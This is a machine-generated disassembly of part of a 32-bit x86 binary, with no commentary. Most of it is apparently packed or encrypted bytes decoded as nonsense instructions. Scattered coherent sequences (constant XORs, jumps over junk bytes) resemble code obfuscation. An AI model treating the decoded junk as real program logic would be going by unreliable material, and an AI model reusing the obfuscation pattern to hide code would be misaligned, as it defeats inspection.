  40a871:	adc    ecx,DWORD PTR [esi-0x57]
  40a874:	dec    esi
  40a875:	add    ah,BYTE PTR [edx]
  40a877:	mov    ds:0x8c86b51e,eax
  40a87c:	adc    al,0xe8
  40a87e:	inc    ebp
  40a87f:	mov    ebx,0xcfb448f6
  40a884:	cdq    
  40a885:	test   eax,0x1bd11da1
  40a88a:	jecxz  0x40a817
  40a88c:	xchg   edi,eax
  40a88d:	out    0xbe,eax
  40a88f:	lods   al,BYTE PTR ds:[esi]
  40a890:	push   ebp
  40a891:	mov    ch,0xbf
  40a893:	call   0x748a:0xe4de6b2c
  40a89a:	and    bh,BYTE PTR [eax]
  40a89c:	popf   
  40a89d:	pop    es
  40a89e:	or     ecx,0x59966b59
  40a8a4:	and    BYTE PTR [ebp+0x3],ch
  40a8a7:	push   ebx
  40a8a8:	mov    DWORD PTR ds:0xa32230a2,0x660e1197
  40a8b2:	pop    es
  40a8b3:	int    0x1e
  40a8b5:	stos   DWORD PTR es:[edi],eax
  40a8b6:	pop    ebx
  40a8b7:	mov    dl,0x82
  40a8b9:	mov    ds:0x367a6a82,eax
  40a8be:	clc    
  40a8bf:	mov    edx,0x65ab0b4d
  40a8c4:	pop    ds
  40a8c5:	shl    BYTE PTR [edx+0x58175ecd],1
  40a8cb:	ficomp WORD PTR [edi]
  40a8cd:	inc    edx
  40a8ce:	jnp    0x40a8ca
  40a8d0:	je     0x40a8f7
  40a8d2:	sahf   
  40a8d3:	push   0x18
  40a8d5:	mov    edx,DWORD PTR [edx+0xa]
  40a8d8:	stc    
  40a8d9:	jl     0x40a907
  40a8db:	retf   
  40a8dc:	inc    eax
  40a8dd:	repz mov eax,0x32159758
  40a8e3:	imul   edx,DWORD PTR [eax+0x22],0xffffffb0
  40a8e7:	or     al,0x4f
  40a8e9:	(bad)  
  40a8ea:	rcl    ebx,cl
  40a8ec:	mov    ds:0x2c6a11ba,al
  40a8f1:	xchg   edx,eax
  40a8f2:	das    
  40a8f3:	(bad)  
  40a8f4:	stc    
  40a8f5:	cmp    esi,esp
  40a8f7:	rol    BYTE PTR [edi],1
  40a8f9:	ret    
  40a8fa:	xchg   ebp,eax
  40a8fb:	or     dl,BYTE PTR [esi+0x52]
  40a8fe:	xor    BYTE PTR [edi+0x5b59157f],ah
  40a904:	imul   di,WORD PTR [eax+0x64],0x21d0
  40a90a:	cmc    
  40a90b:	outs   dx,BYTE PTR ds:[esi]
  40a90c:	fidivr WORD PTR [eax+edx*4+0x1a34ee44]
  40a913:	push   ss
  40a914:	jmp    0x40a98d
  40a916:	(bad)  
  40a917:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a919:	ss aas 
  40a91b:	inc    ecx
  40a91c:	push   esp
  40a91d:	mov    esi,0x8c6c6dee
  40a922:	mov    DWORD PTR [eax],edi
  40a924:	mov    eax,DWORD PTR [ebp-0x14]
  40a927:	mov    ebx,DWORD PTR [ebp-0x8]
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    DWORD PTR [ebp+0xf],ecx
  40a949:	leave  
  40a94a:	push   0xffffffda
  40a94c:	cmp    DWORD PTR [eax+0x78],0x74
  40a950:	jle    0x40a9ca
  40a952:	js     0x40a97a
  40a954:	push   ss
  40a955:	xchg   ebx,eax
  40a956:	dec    edx
  40a957:	loop   0x40a986
  40a959:	jb     0x40a99e
  40a95b:	xchg   edx,eax
  40a95c:	push   ebx
  40a95d:	push   0xe6920146
  40a962:	and    ah,BYTE PTR [edi+0x37]
  40a965:	mov    ecx,0xde3a8860
  40a96a:	pop    ebp
  40a96b:	in     eax,dx
  40a96c:	sbb    bl,ch
  40a96e:	pushf  
  40a96f:	enter  0x12a7,0xc5
  40a973:	sub    BYTE PTR [esp+esi*1-0x6b],dl
  40a977:	xchg   edx,eax
  40a978:	nop
  40a979:	add    al,0x4d
  40a97b:	mov    ebx,0x404ad0e6
  40a980:	or     DWORD PTR [esi+0x495991df],0xa265f98e
  40a98a:	jmp    0x33e1:0x8d207448
  40a991:	mov    eax,ds:0xd6931693
  40a996:	sbb    cl,0xde
  40a999:	in     al,0x28
  40a99b:	retf   
  40a99c:	fst    DWORD PTR [edi+0x31ad3a60]
  40a9a2:	dec    edi
  40a9a3:	and    BYTE PTR [ecx-0x5b],al
  40a9a6:	inc    esi
  40a9a7:	imul   BYTE PTR [edi-0x21]
  40a9aa:	fnstcw WORD PTR [ebp-0x11]
  40a9ad:	int3   
  40a9ae:	mov    esi,ss
  40a9b0:	xchg   edx,ecx
  40a9b2:	icebp  
  40a9b3:	mov    dl,0x79
  40a9b5:	add    BYTE PTR [edx],0x9e
  40a9b8:	mov    DWORD PTR [ebp-0x8],ebp
  40a9bb:	stc    
  40a9bc:	inc    ebx
  40a9bd:	les    esp,FWORD PTR [ebx]
  40a9bf:	imul   eax,eax,0x7e8e4900
  40a9c5:	es dec ebx
  40a9c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9c8:	sub    al,0x29
  40a9ca:	and    esp,DWORD PTR [ebp+0x28]
  40a9cd:	mov    ebp,0xa93e10f8
  40a9d2:	fild   WORD PTR [edi-0x28e479d1]
  40a9d8:	(bad)  
  40a9d9:	pop    esp
  40a9da:	adc    BYTE PTR [eax-0x4a],al
  40a9dd:	or     DWORD PTR [esi-0x54318fba],ecx
  40a9e3:	pop    esi
  40a9e4:	mov    dl,0xbe
  40a9e6:	test   al,0x92
  40a9e8:	icebp  
  40a9e9:	push   es
  40a9ea:	(bad)  
  40a9eb:	and    BYTE PTR [eax-0x2fcaacf2],bl
  40a9f1:	int3   
  40a9f2:	rcr    DWORD PTR ds:0x34e2d1d8,0xba
  40a9f9:	mov    WORD PTR [edx-0x18865311],ds
  40a9ff:	test   al,0x0
  40aa01:	cld    
  40aa02:	dec    esi
  40aa03:	xor    al,0xc
  40aa05:	mov    BYTE PTR [ebp+0x686d386b],ah
  40aa0b:	ficom  DWORD PTR [edi]
  40aa0d:	xor    eax,DWORD PTR [ecx-0x3e56b67d]
  40aa13:	mov    dl,0xa1
  40aa15:	psubq  mm0,QWORD PTR [edx-0x62]
  40aa19:	cld    
  40aa1a:	and    ebx,esp
  40aa1c:	jb     0x40a9da
  40aa1e:	jbe    0x40aa74
  40aa20:	loop   0x40aa6a
  40aa22:	cwde   
  40aa23:	ds add eax,0xf716a3c6
  40aa29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa2a:	fld    TBYTE PTR [edi-0x2ccf5b3c]
  40aa30:	(bad)  
  40aa31:	pop    ecx
  40aa32:	mov    eax,0x34d7c657
  40aa37:	mov    al,ds:0x1aaee287
  40aa3c:	mov    al,0xbf
  40aa3e:	mov    esp,0x98279e1e
  40aa43:	mov    cl,0xc8
  40aa45:	add    bl,dl
  40aa47:	pusha  
  40aa48:	xchg   ecx,eax
  40aa49:	dec    esp
  40aa4a:	cmp    ah,cl
  40aa4c:	dec    esi
  40aa4d:	push   es
  40aa4e:	imul   esp,DWORD PTR [ebp-0x6cf2f659],0x3c
  40aa55:	jmp    DWORD PTR [ecx-0x4be8727a]
  40aa5b:	call   0x853f:0x243b806b
  40aa62:	ja     0x40aa1e
  40aa64:	pop    esp
  40aa65:	sar    BYTE PTR [edi],cl
  40aa67:	lds    edx,FWORD PTR [ecx-0x524bf839]
  40aa6d:	add    eax,0xa898da52
  40aa72:	and    DWORD PTR [esp+ebp*4-0x45ddadfc],0xffffff96
  40aa7a:	push   0x86a4e9da
  40aa7f:	pop    edi
  40aa80:	fwait
  40aa81:	ja     0x40aa64
  40aa83:	pop    ebx
  40aa84:	xchg   esi,eax
  40aa85:	xchg   edi,eax
  40aa86:	adc    BYTE PTR [edi],0x44
  40aa89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa8a:	jno    0x40aad0
  40aa8c:	mov    ecx,DWORD PTR [eax+0x1c]
  40aa8f:	aam    0xa1
  40aa91:	cdq    
  40aa92:	mov    ds:0x31c4022c,al
  40aa97:	mov    bl,0x2d
  40aa99:	cmp    BYTE PTR [edx],dh
  40aa9b:	(bad)  
  40aa9c:	cli    
  40aa9d:	and    ebp,DWORD PTR [edi-0x4b3e7671]
  40aaa3:	ins    BYTE PTR es:[edi],dx
  40aaa4:	add    eax,0x386efed0
  40aaa9:	push   0x7d02aaeb
  40aaae:	jmp    0x9b741319
  40aab3:	xchg   esp,eax
  40aab4:	mul    DWORD PTR [ebx+0x18b7d6c2]
  40aaba:	pop    ss
  40aabb:	inc    esp
  40aabc:	shl    BYTE PTR [ecx-0x4e],0x87
  40aac0:	fld    TBYTE PTR [ebp+ebx*1+0x47e21509]
  40aac7:	adc    ebp,edx
  40aac9:	inc    eax
  40aaca:	out    dx,eax
  40aacb:	jae    0x40aac4
  40aacd:	clc    
  40aace:	stos   BYTE PTR es:[edi],al
  40aacf:	test   BYTE PTR [ecx],bl
  40aad1:	sar    DWORD PTR [ecx+0x13e287f3],cl
  40aad7:	cs push 0x928882e9
  40aadd:	add    dl,BYTE PTR [esi-0x79]
  40aae0:	dec    DWORD PTR [esi+edi*2+0x1bf81c36]
  40aae7:	fistp  QWORD PTR [edi]
  40aae9:	lahf   
  40aaea:	push   es
  40aaeb:	cmp    edx,0xcb1b40db
  40aaf1:	sub    ecx,ebp
  40aaf3:	or     BYTE PTR cs:[ecx],cl
  40aaf6:	mov    dl,0xf7
  40aaf8:	and    ecx,edi
  40aafa:	xor    al,0xeb
  40aafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aafd:	cs jmp 0x40ab30
  40ab00:	test   al,0x8
  40ab02:	adc    eax,0xee962f3f
  40ab07:	das    
  40ab08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab09:	adc    ecx,DWORD PTR [esp+edx*4+0x79af4b8b]
  40ab10:	mov    ?,WORD PTR [edx+eax*4+0x52]
  40ab14:	js     0x40ab8f
  40ab16:	add    BYTE PTR [eax-0x3e],dh
  40ab19:	outs   dx,DWORD PTR ds:[esi]
  40ab1a:	leave  
  40ab1b:	or     bl,bh
  40ab1d:	je     0x40aadc
  40ab1f:	cmp    ebp,edx
  40ab21:	sub    al,0x32
  40ab23:	mov    al,ds:0xcee0516d
  40ab28:	jae    0x40ab9b
  40ab2a:	call   0x49715176
  40ab2f:	out    0x3d,eax
  40ab31:	mov    BYTE PTR [eax],ch
  40ab33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab34:	jmp    0x1f8d637
  40ab39:	mov    esp,0x537dfa1f
  40ab3f:	sub    ebp,ebp
  40ab41:	jmp    0x4e6d0ccb
  40ab46:	test   BYTE PTR [eax+0x56],0x12
  40ab4a:	mov    edi,0x40e90318
  40ab4f:	push   ebx
  40ab50:	in     al,0x53
  40ab52:	fisubr DWORD PTR [ebx+0x23554313]
  40ab58:	icebp  
  40ab59:	push   ebp
  40ab5a:	loope  0x40abd7
  40ab5c:	xchg   DWORD PTR ds:0x9d0dff90,ecx
  40ab62:	or     ebp,DWORD PTR [ebp+0x2a0ce081]
  40ab68:	mov    gs,WORD PTR [eax-0x55a32432]
  40ab6e:	or     eax,0x60558f91
  40ab73:	dec    edi
  40ab74:	out    dx,eax
  40ab75:	cmp    DWORD PTR [edx],edx
  40ab77:	cwde   
  40ab78:	jnp    0x40ab56
  40ab7a:	mov    ebp,0xa0a21b28
  40ab7f:	mov    ebx,0x881e9dc7
  40ab84:	shr    BYTE PTR [ebx],cl
  40ab86:	cdq    
  40ab87:	ds loope 0x40ab7a
  40ab8a:	mov    fs,WORD PTR ds:[edx-0x7e1fcc0b]
  40ab91:	ss cmp ebx,ebx
  40ab94:	stos   BYTE PTR es:[edi],al
  40ab95:	enter  0x781b,0x79
  40ab99:	cmp    eax,0x8c598e17
  40ab9e:	xchg   esp,eax
  40ab9f:	or     DWORD PTR [ebp+0x3ecba086],0x6
  40aba6:	mov    dl,0x3
  40aba8:	add    DWORD PTR [ecx-0x76],0x11b0be13
  40abaf:	outs   dx,BYTE PTR ds:[esi]
  40abb0:	icebp  
  40abb1:	std    
  40abb2:	lahf   
  40abb3:	(bad)  
  40abb4:	jo     0x40ac04
  40abb6:	mov    gs,WORD PTR [eax-0x2b]
  40abb9:	xchg   edi,eax
  40abba:	mov    al,0x4
  40abbc:	(bad)  
  40abbd:	mov    ds:0xb97618a1,eax
  40abc2:	push   edi
  40abc3:	or     eax,0xa25e74f5
  40abc8:	mov    ebx,0xa632c213
  40abcd:	ins    DWORD PTR es:[edi],dx
  40abce:	and    DWORD PTR [esi+0x34],ebx
  40abd1:	outs   dx,DWORD PTR ds:[esi]
  40abd2:	or     eax,0x3bb20b34
  40abd7:	test   al,0xf7
  40abd9:	add    al,BYTE PTR [eax+0x4d]
  40abdc:	call   0xcd96771c
  40abe1:	cwde   
  40abe2:	xchg   ebx,eax
  40abe3:	jmp    0x4528d861
  40abe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abe9:	imul   esi,DWORD PTR [edx+esi*1+0x34c5142e],0x1230f7c6
  40abf4:	in     eax,dx
  40abf5:	fbld   TBYTE PTR [ebx-0x14]
  40abf8:	mov    edi,0xba39349f
  40abfd:	or     dl,BYTE PTR [ecx]
  40abff:	add    eax,0x12190094
  40ac04:	adc    al,BYTE PTR [edi+0x50bf2acc]
  40ac0a:	jl     0x40ac64
  40ac0c:	jp     0x40ac43
  40ac0e:	stc    
  40ac0f:	(bad)  
  40ac10:	rcr    DWORD PTR [ebp+0x27],cl
  40ac13:	lgs    eax,FWORD PTR [edi-0x3]
  40ac17:	jno    0x40ac1a
  40ac19:	add    al,0x93
  40ac1b:	inc    ebp
  40ac1c:	aam    0x74
  40ac1e:	push   0x3d
  40ac20:	xor    eax,0xbc1c1e0e
  40ac25:	xor    DWORD PTR [ecx+0x5ec5205c],0xffffff8d
  40ac2c:	pop    edi
  40ac2d:	cmp    eax,0xe533e213
  40ac32:	sbb    edx,DWORD PTR [ebp-0x34]
  40ac35:	mov    dl,0xe8
  40ac37:	out    0x2d,eax
  40ac39:	inc    esp
  40ac3a:	lds    esp,FWORD PTR [ebx-0x26]
  40ac3d:	je     0x40ac7d
  40ac3f:	and    eax,0xebaf8f02
  40ac44:	mov    bl,0x14
  40ac46:	push   ss
  40ac47:	xor    edi,0xbc2d7163
  40ac4d:	or     DWORD PTR [esi-0x2dcc26cd],0xde03c603
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	cvtps2pi mm1,QWORD PTR [ebp-0x7f298b44]
  40ac92:	js     0x40ad0c
  40ac94:	je     0x40ad14
  40ac96:	js     0x40ad10
  40ac98:	in     al,dx
  40ac99:	(bad)  
  40ac9a:	pop    ebx
  40ac9b:	ret    0xa908
  40ac9e:	sub    bh,ah
  40aca0:	sub    ecx,DWORD PTR [edx-0x36]
  40aca3:	pop    ecx
  40aca4:	dec    eax
  40aca5:	push   eax
  40aca6:	clc    
  40aca7:	sbb    edx,DWORD PTR [ebx-0x534ccdcb]
  40acad:	jno    0x40acb0
  40acaf:	std    
  40acb0:	test   DWORD PTR [edi-0x7fc97758],0xf40b8936
  40acba:	xchg   DWORD PTR ss:[edi+0x13bf0cfe],ebp
  40acc1:	and    dl,dl
  40acc3:	sub    eax,DWORD PTR [edi*4+0x70d8732a]
  40acca:	sbb    BYTE PTR [eax],0x50
  40accd:	dec    esp
  40acce:	push   ss
  40accf:	loop   0x40ac63
  40acd1:	pop    eax
  40acd2:	sbb    eax,esp
  40acd4:	sub    edi,edi
  40acd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acd7:	sbb    ah,BYTE PTR [edx+0x4f1fe879]
  40acdd:	sar    BYTE PTR [ebx-0x6b336dd3],0x23
  40ace4:	cmp    BYTE PTR [esi],dh
  40ace6:	sbb    al,0xb1
  40ace8:	or     BYTE PTR [edx+ebx*8],bh
  40aceb:	and    edx,DWORD PTR [edi]
  40aced:	ja     0x40ac87
  40acef:	je     0x40ace8
  40acf1:	repz aad 0xea
  40acf4:	iret   
  40acf5:	mov    cl,0x3c
  40acf7:	jle    0x40ad26
  40acf9:	cwde   
  40acfa:	ds mov dh,0xae
  40acfd:	cmc    
  40acfe:	push   0xffffff87
  40ad00:	xor    BYTE PTR [edi+0x6d],bh
  40ad03:	lea    eax,[ebx-0x34]
  40ad06:	jb     0x40ac8f
  40ad08:	adc    eax,0x11680f5f
  40ad0d:	in     eax,dx
  40ad0e:	and    esp,DWORD PTR [edx]
  40ad10:	lods   eax,DWORD PTR ds:[esi]
  40ad11:	scas   eax,DWORD PTR es:[edi]
  40ad12:	(bad)  
  40ad14:	fidivr WORD PTR [esi+ecx*4+0x1f91fa7a]
  40ad1b:	popa   
  40ad1c:	int    0x8d
  40ad1e:	push   ds
  40ad1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad20:	por    mm7,QWORD PTR [eax]
  40ad23:	popf   
  40ad24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad25:	and    DWORD PTR [edi-0x39957d7],ebx
  40ad2b:	retf   
  40ad2c:	pop    esp
  40ad2d:	sbb    al,0x81
  40ad2f:	inc    eax
  40ad30:	aam    0xf1
  40ad32:	fsub   QWORD PTR [edx+0x5e]
  40ad35:	jge    0x40ad17
  40ad37:	dec    esp
  40ad38:	cmp    eax,0x82129a35
  40ad3d:	dec    ebx
  40ad3e:	in     al,0x62
  40ad40:	mov    al,ds:0xfd15d640
  40ad45:	push   ebp
  40ad46:	aam    0xd5
  40ad48:	pop    ebp
  40ad49:	loop   0x40ad0d
  40ad4b:	mov    bh,0xd2
  40ad4d:	and    edx,eax
  40ad4f:	test   al,0x16
  40ad51:	scas   eax,DWORD PTR es:[edi]
  40ad52:	jbe    0x40ad6d
  40ad54:	cmp    al,0xf5
  40ad56:	push   ecx
  40ad57:	xchg   ecx,eax
  40ad58:	ds inc edi
  40ad5a:	fld    st(5)
  40ad5c:	stos   DWORD PTR es:[edi],eax
  40ad5d:	jne    0x40add1
  40ad5f:	dec    edx
  40ad60:	stos   BYTE PTR es:[edi],al
  40ad61:	mov    cl,0x2
  40ad63:	mov    ch,0x9e
  40ad65:	or     BYTE PTR [esi+0x66eee2d7],bh
  40ad6b:	shr    ecx,1
  40ad6d:	ins    BYTE PTR es:[di],dx
  40ad6f:	sar    esp,0xa6
  40ad72:	mov    ecx,0x9e1ca746
  40ad77:	lock mov bl,0x9a
  40ad7a:	jl     0x40ad76
  40ad7c:	or     eax,0x8494d85b
  40ad81:	jmp    0x14a0:0xd2ff2447
  40ad88:	or     dl,al
  40ad8a:	xchg   ebx,eax
  40ad8b:	enter  0xbf84,0xe3
  40ad8f:	out    dx,al
  40ad90:	outs   dx,BYTE PTR ds:[esi]
  40ad91:	cdq    
  40ad92:	mov    eax,ds:0x5c191280
  40ad97:	jecxz  0x40ad8b
  40ad99:	and    dh,BYTE PTR [edi-0xb7ad1dd]
  40ad9f:	in     eax,dx
  40ada0:	mov    ebx,0x60437743
  40ada5:	stc    
  40ada6:	add    DWORD PTR [eax-0x449243d7],0x341e0a30
  40adb0:	icebp  
  40adb1:	sbb    eax,0x67c3b2ed
  40adb6:	mov    eax,0xa59b054c
  40adbb:	enter  0xadd9,0x32
  40adbf:	mov    dl,BYTE PTR [ecx-0x65]
  40adc2:	or     al,0x38
  40adc4:	lods   al,BYTE PTR ds:[esi]
  40adc5:	cli    
  40adc6:	jb     0x40ae29
  40adc8:	ret    
  40adc9:	in     eax,dx
  40adca:	and    eax,edi
  40adcc:	sar    BYTE PTR [ebx+esi*1+0x39],1
  40add0:	test   al,0xa9
  40add2:	jl     0x40ade1
  40add4:	test   al,0x6f
  40add6:	arpl   WORD PTR ds:0xf7c9989f,bx
  40addc:	and    ah,BYTE PTR [eax+0x38bf2534]
  40ade2:	jle    0x40ad67
  40ade4:	pop    ebx
  40ade5:	out    dx,eax
  40ade6:	cmp    eax,0x6182791c
  40adeb:	sub    eax,0x14fd8dd6
  40adf0:	jns    0x40ae09
  40adf2:	loop   0x40ae5b
  40adf4:	(bad)  
  40adf5:	cmp    eax,0x6b1e23c
  40adfa:	cmp    eax,0xaa7072d9
  40adff:	sbb    esi,DWORD PTR [esi-0x3dda047d]
  40ae05:	push   esi
  40ae06:	jg     0x40ae59
  40ae08:	pushf  
  40ae09:	sub    DWORD PTR [ecx+0x17],eax
  40ae0c:	gs pop eax
  40ae0e:	test   BYTE PTR [esi],bl
  40ae10:	sbb    eax,0xbb40376d
  40ae15:	js     0x40ae7b
  40ae17:	pop    ebx
  40ae18:	inc    edx
  40ae19:	sub    eax,0x74d38c85
  40ae1e:	xchg   esi,eax
  40ae1f:	add    BYTE PTR ds:0x212bd654,ch
  40ae25:	pop    eax
  40ae26:	sbb    eax,0xc1d742da
  40ae2b:	push   0x933d65d0
  40ae30:	adc    BYTE PTR [eax+0x60ee49ba],dh
  40ae36:	push   esp
  40ae37:	fwait
  40ae38:	sub    BYTE PTR [ecx+eiz*8-0x5a],ch
  40ae3c:	in     al,0xfd
  40ae3e:	sub    DWORD PTR [edx+0x228a4cd],edx
  40ae44:	in     eax,0xa8
  40ae46:	call   0xa68d706b
  40ae4b:	adc    al,0xff
  40ae4d:	xor    eax,0x52aa1d7f
  40ae52:	out    0x9e,al
  40ae54:	pop    ebx
  40ae55:	jno    0x40adff
  40ae57:	and    edx,DWORD PTR [eax+0x4e]
  40ae5a:	pop    esp
  40ae5b:	mov    ah,0xb8
  40ae5d:	(bad)  
  40ae5e:	imul   ecx,DWORD PTR [edi+0x4e],0xffffffb1
  40ae62:	mov    edi,0xe9173855
  40ae67:	stos   DWORD PTR es:[edi],eax
  40ae68:	retf   0x359d
  40ae6b:	mov    BYTE PTR [eax+ebx*4-0x77],dh
  40ae6f:	inc    ebp
  40ae70:	retf   0xe224
  40ae73:	cmp    ah,bl
  40ae75:	cmc    
  40ae76:	ror    ebp,0xd
  40ae79:	gs jne 0x40aeab
  40ae7c:	dec    eax
  40ae7d:	push   0x58b6bf01
  40ae82:	int    0x84
  40ae84:	add    dh,bl
  40ae86:	jg     0x40aeb9
  40ae88:	push   edx
  40ae89:	xor    edi,edx
  40ae8b:	push   eax
  40ae8c:	sub    DWORD PTR [esi+0x74c08641],0x70
  40ae93:	or     BYTE PTR [edx-0x13],bl
  40ae96:	into   
  40ae97:	aam    0xc9
  40ae99:	or     ch,BYTE PTR [ecx+0x53]
  40ae9c:	aam    0xfc
  40ae9e:	adc    ah,BYTE PTR [esi]
  40aea0:	(bad)  
  40aea2:	xor    BYTE PTR [eax+0xe],ah
  40aea5:	push   0x4fcd0e33
  40aeaa:	idiv   cl
  40aeac:	adc    al,0x9d
  40aeae:	stos   BYTE PTR es:[edi],al
  40aeaf:	add    dl,bh
  40aeb1:	cdq    
  40aeb2:	xor    BYTE PTR [eax+0x52175778],ah
  40aeb8:	cmp    BYTE PTR [edx],dl
  40aeba:	add    eax,0xfc0006f7
  40aebf:	jg     0x40af30
  40aec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aec2:	push   es
  40aec3:	aaa    
  40aec4:	sub    ebx,DWORD PTR [eax]
  40aec6:	int3   
  40aec7:	xchg   esi,eax
  40aec8:	(bad)  
  40aec9:	xchg   DWORD PTR es:[esp+edi*1-0x39d67c69],esp
  40aed1:	pop    ebx
  40aed2:	jbe    0x40af29
  40aed4:	sbb    cl,BYTE PTR [ebx+0x3932f418]
  40aeda:	mov    eax,0x3268664c
  40aedf:	int3   
  40aee0:	sub    eax,0x80a9e95c
  40aee5:	fidiv  WORD PTR [eax]
  40aee7:	int    0x8d
  40aee9:	pusha  
  40aeea:	(bad)
  40aeed:	repz xchg ebp,eax
  40aeef:	xor    al,BYTE PTR [edx+0x2cf9e05a]
  40aef5:	hlt    
  40aef6:	cmp    DWORD PTR [ecx+0xe9a523a],esi
  40aefc:	push   cs
  40aefd:	aas    
  40aefe:	sbb    ebx,DWORD PTR ds:0x259378e4
  40af04:	mov    esp,DWORD PTR [edi-0x3a]
  40af07:	seta   dl
  40af0a:	ret    0xabab
  40af0d:	popf   
  40af0e:	xlat   BYTE PTR ds:[ebx]
  40af0f:	lods   eax,DWORD PTR ds:[esi]
  40af10:	fs call 0xb013:0x7ddb2508
  40af18:	push   ss
  40af19:	out    0xff,eax
  40af1b:	jp     0x40aef9
  40af1d:	(bad)  
  40af1e:	je     0x40aead
  40af20:	mov    edx,0x73234c2c
  40af25:	popa   
  40af26:	test   eax,0x87a71d72
  40af2b:	cmp    eax,0xce8605bf
  40af30:	xchg   edi,eax
  40af31:	push   edx
  40af32:	push   0x24fb90bc
  40af37:	ret    
  40af38:	xchg   edx,eax
  40af39:	dec    edi
  40af3a:	pop    ebx
  40af3b:	add    ebp,DWORD PTR [edi-0x2f]
  40af3e:	ja     0x40afa6
  40af40:	cmp    ecx,DWORD PTR [eax+edx*1]
  40af43:	jbe    0x40af0a
  40af45:	pop    edi
  40af46:	sbb    cl,dl
  40af48:	es scas al,BYTE PTR es:[edi]
  40af4a:	stos   WORD PTR es:[edi],ax
  40af4c:	ret    0xaefc
  40af4f:	mov    WORD PTR [esi+edx*1],cs
  40af52:	ror    DWORD PTR [esi],0x2d
  40af55:	imul   BYTE PTR [edi]
  40af57:	add    DWORD PTR [ebx],0x1e9b989
  40af5d:	fistp  WORD PTR [eax+0x71]
  40af60:	ret    0xfa1d
  40af63:	jge    0x40af0c
  40af65:	xor    cl,BYTE PTR [ebp+0x14]
  40af68:	les    eax,FWORD PTR [edx]
  40af6a:	pop    ecx
  40af6b:	in     eax,dx
  40af6c:	loopne 0x40af12
  40af6e:	clc    
  40af6f:	push   cs
  40af70:	cs push ebx
  40af72:	pop    eax
  40af73:	(bad)  
  40af74:	push   ebx
  40af75:	cmp    edx,DWORD PTR [ebx-0x52a29262]
  40af7b:	fimul  WORD PTR ds:[ebx]
  40af7e:	in     al,0x40
  40af80:	(bad)
  40af83:	mov    ds:0x47d1d10a,al
  40af88:	add    eax,0xd3c2b387
  40af8d:	ret    0x7226
  40af90:	loopne 0x40af67
  40af92:	pop    ds
  40af93:	dec    eax
  40af94:	mov    edx,DWORD PTR [eax]
  40af96:	imul   edx,edx,0xf89ea9ed
  40af9c:	mov    DWORD PTR [eax],edx
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	test   esi,ebp
  40afb4:	test   DWORD PTR [ecx],esp
  40afb6:	rol    BYTE PTR [ebp+0x7e747878],cl
  40afbc:	js     0x40b036
  40afbe:	adc    ah,0xb8
  40afc1:	mov    bl,0x3b
  40afc3:	push   esp
  40afc4:	enter  0x9b7d,0x70
  40afc8:	repz dec BYTE PTR [esi]
  40afcb:	mov    esp,0x8f990c31
  40afd0:	in     eax,dx
  40afd1:	add    eax,0xd6a056ea
  40afd6:	pop    ebx
  40afd7:	mov    eax,ds:0xbfbc9e70
  40afdc:	mov    bl,0xce
  40afde:	imul   esp,DWORD PTR [edi],0x1f
  40afe1:	or     BYTE PTR [edi],al
  40afe3:	aaa    
  40afe4:	shl    dl,1
  40afe6:	xor    DWORD PTR [eax-0x47aa6691],ebx
  40afec:	or     DWORD PTR [ebx],0x29
  40afef:	mov    bl,0x7e
  40aff1:	mov    ds:0xcbfe7ad9,al
  40aff6:	sar    DWORD PTR [edi],cl
  40aff8:	mov    ecx,DWORD PTR [edi+0x1ed52d62]
  40affe:	pop    edi
  40afff:	cmp    al,0x46
  40b001:	sahf   
  40b002:	div    BYTE PTR [edi+0x47298baa]
  40b008:	js     0x40b074
  40b00a:	jg     0x40afe7
  40b00c:	dec    esp
  40b00d:	test   DWORD PTR [eax-0xc3d4efd],edi
  40b013:	sbb    ebx,edx
  40b015:	mov    al,ds:0x586deac9
  40b01a:	pause  
  40b01c:	mov    cl,0x2f
  40b01e:	dec    esi
  40b01f:	dec    ebx
  40b020:	or     DWORD PTR [ebx-0x2d],edx
  40b023:	jmp    0xec3e:0x662cba4
  40b02a:	push   esi
  40b02b:	stc    
  40b02c:	int    0xec
  40b02e:	push   ss
  40b02f:	push   esi
  40b030:	fisubr DWORD PTR ss:[eax-0x2]
  40b034:	sahf   
  40b035:	arpl   WORD PTR [edi+0x28c5dace],cx
  40b03b:	pop    ebp
  40b03c:	fnstcw WORD PTR ds:0x3f518735
  40b042:	mov    bh,0xc6
  40b044:	mov    ds:0xe1f9bdea,eax
  40b049:	imul   ecx,DWORD PTR ds:[ecx+esi*8],0x7441f5af
